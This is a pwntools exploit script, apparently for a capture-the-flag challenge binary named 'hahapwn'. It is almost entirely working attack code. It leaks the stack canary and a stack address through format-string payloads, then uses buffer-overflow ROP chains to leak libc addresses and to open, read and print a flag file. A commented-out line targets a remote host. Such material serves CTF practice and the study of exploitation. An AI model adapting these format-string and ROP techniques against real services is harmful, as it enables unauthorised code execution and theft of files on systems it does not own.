from pwn import *

io = process('./hahapwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# io = remote('210.30.97.133',28062)
context.log_level = 'debug'
elf = ELF('./hahapwn')
# libc = ELF('./libc-2.23.so')
puts_plt = 0x000000004005b0
puts_got = 0x601018
welcomeaddr = 0x400726
pop_rdi = 0x0000000000400943 #: pop rdi ; ret

payload = '%27$p'
io.sendlineafter('What is your name?',payload)
io.recvuntil('Hello \n')
canary = int(io.recv(18),16)
success("canary-->"+hex(canary))
pause()
payload = b'a'*0x68 + p64(canary) + b'b'*0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(welcomeaddr)
io.sendlineafter('What can we help you',payload)

# io.recvuntil(b'b'*8)
puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
libc.address = libc_base
one_gadget = libc_base + 0x45216
success("libc_base-->"+hex(libc_base))
pause()

payload = '%32$paaaflag\0'
io.sendlineafter('name?\n', payload)

io.recvuntil('Hello \n')
flag_addr = int(io.recv(14), 16) + 0x48 - 0x200
success('flag -> %s' % hex(flag_addr))

# pop_rsi_ret = libc_base +0x00000000000202e8 #: pop rsi ; ret
# pop_rdx_ret = libc_base + 0x0000000000001b92 #: pop rdx ; ret
pop_rsi_ret = 0x2601f+ libc_base# local 
pop_rdx_ret = 0x142c92+ libc_base# local
open_addr = libc.sym.open
read_addr = libc.sym.read

payload =  b'a'*0x68
payload += p64(canary)
payload += b'a'*0x8

payload += p64(pop_rdi)
payload += p64(flag_addr)
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(open_addr)

payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi_ret)
payload += p64(flag_addr)
payload += p64(pop_rdx_ret)
payload += p64(0x30)
payload += p64(read_addr)

payload += p64(pop_rdi)
payload += p64(flag_addr)
payload += p64(puts_plt)

io.sendlineafter('you?\n', payload)
io.interactive()
